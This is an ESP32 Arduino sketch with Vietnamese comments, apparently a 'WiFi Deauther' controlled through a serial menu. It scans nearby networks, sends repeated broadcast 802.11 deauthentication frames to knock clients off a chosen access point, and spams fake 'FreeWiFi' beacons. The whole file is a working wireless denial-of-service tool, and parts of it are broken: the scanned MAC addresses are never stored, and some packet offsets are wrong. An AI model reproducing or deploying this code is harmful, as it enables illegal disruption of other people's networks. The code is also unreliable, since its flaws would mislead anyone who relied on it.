#include <WiFi.h>
#include "esp_wifi.h"

#define MAX_APs 50

struct AP {
  String ssid;
  uint8_t mac[6];
  int channel;
  int rssi;
};

AP apList[MAX_APs];
int apCount = 0;
int selectedAP = -1;
bool attacking = false;
bool beaconSpam = false;

// ====== Gói deauth ======
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination (broadcast)
  0x00, 0x11, 0x22, 0x33, 0x44, 0x55,  // Source (AP MAC)
  0x00, 0x11, 0x22, 0x33, 0x44, 0x55,  // BSSID (AP MAC)
  0x00, 0x00,
  0x07, 0x00
};

// ====== Gói beacon spam ======
const char *fakeSSID = "FreeWiFi";
uint8_t beaconPacket[128] = {
  0x80, 0x00, 0x00, 0x00,
  // [4-9] = destination, [10-15] = source, [16-21] = BSSID
};

// ====== Gửi deauth ======
void sendDeauth() {
  if (selectedAP >= 0) {
    esp_wifi_set_channel(apList[selectedAP].channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  }
}

// ====== Gửi beacon spam ======
void sendBeacon() {
  uint8_t pkt[64] = {
    0x80, 0x00, 0x00, 0x00,
    0xff,0xff,0xff,0xff,0xff,0xff, // dest
    0x11,0x22,0x33,0x44,0x55,0x66, // source
    0x11,0x22,0x33,0x44,0x55,0x66, // bssid
    0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00, 0x01,
    0x00, 0x00,
    0x01, 0x08,
    0x82, 0x84, 0x8b, 0x96,
    0x0c, 0x12, 0x18, 0x24
  };
  int ssidLen = strlen(fakeSSID);
  pkt[37] = 0x00;
  pkt[38] = ssidLen;
  memcpy(&pkt[39], fakeSSID, ssidLen);
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, 39 + ssidLen, false);
}

// ====== Quét WiFi ======
void scanAPs() {
  Serial.println("\n🔎 Scanning WiFi...");
  apCount = WiFi.scanNetworks();
  if (apCount == 0) {
    Serial.println("❌ No networks found!");
    return;
  }

  if (apCount > MAX_APs) apCount = MAX_APs;

  for (int i = 0; i < apCount; i++) {
    apList[i].ssid = WiFi.SSID(i);
    apList[i].rssi = WiFi.RSSI(i);
    apList[i].channel = WiFi.channel(i);
    WiFi.BSSID(i);
  }

  Serial.println("📋 Available Networks:");
  for (int i = 0; i < apCount; i++) {
    Serial.printf("%d) %s | Ch:%d | RSSI:%d | MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
                  i,
                  apList[i].ssid.c_str(),
                  apList[i].channel,
                  apList[i].rssi,
                  apList[i].mac[0], apList[i].mac[1], apList[i].mac[2],
                  apList[i].mac[3], apList[i].mac[4], apList[i].mac[5]);
  }
}

// ====== Chọn AP ======
void selectAP(int index) {
  if (index >= 0 && index < apCount) {
    selectedAP = index;
    memcpy(&deauthPacket[10], apList[index].mac, 6); // Source
    memcpy(&deauthPacket[16], apList[index].mac, 6); // BSSID
    Serial.printf("✔ Selected AP: %s (CH %d)\n", apList[index].ssid.c_str(), apList[index].channel);
  } else {
    Serial.println("❌ Invalid AP index!");
  }
}

// ====== Menu chính ======
void showMenu() {
  Serial.println("\n=== ESP32 WiFi Deauther (Serial UI) ===");
  Serial.println("1) Scan WiFi");
  Serial.println("2) Select AP");
  Serial.println("3) Start Deauth Attack");
  Serial.println("4) Stop Attack");
  Serial.println("5) Start Beacon Spam");
  Serial.println("6) Stop Beacon Spam");
  Serial.println("7) Status");
  Serial.println("0) Help/Menu");
}

void processCommand(String cmd) {
  cmd.trim();

  if (cmd == "1") scanAPs();
  else if (cmd.startsWith("2")) {
    int index = cmd.substring(2).toInt();
    selectAP(index);
  }
  else if (cmd == "3") {
    if (selectedAP >= 0) {
      attacking = true;
      Serial.println("⚡ Deauth attack started...");
    } else Serial.println("❌ No AP selected!");
  }
  else if (cmd == "4") {
    attacking = false;
    Serial.println("⏹ Deauth stopped.");
  }
  else if (cmd == "5") {
    beaconSpam = true;
    Serial.println("⚡ Beacon spam started...");
  }
  else if (cmd == "6") {
    beaconSpam = false;
    Serial.println("⏹ Beacon spam stopped.");
  }
  else if (cmd == "7") {
    if (selectedAP >= 0) {
      Serial.printf("📡 Target: %s | CH:%d | MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
                    apList[selectedAP].ssid.c_str(),
                    apList[selectedAP].channel,
                    apList[selectedAP].mac[0], apList[selectedAP].mac[1], apList[selectedAP].mac[2],
                    apList[selectedAP].mac[3], apList[selectedAP].mac[4], apList[selectedAP].mac[5]);
    } else Serial.println("ℹ No AP selected.");
    Serial.println(attacking ? "⚡ Deauth active" : "⏹ Deauth idle");
    Serial.println(beaconSpam ? "⚡ Beacon spam active" : "⏹ Beacon spam idle");
  }
  else if (cmd == "0") showMenu();
  else Serial.println("❓ Unknown command! Type 0 for menu.");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_MODE_STA);
  showMenu();
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    processCommand(cmd);
  }

  if (attacking) {
    sendDeauth();
    delay(50);
  }

  if (beaconSpam) {
    sendBeacon();
    delay(100);
  }
}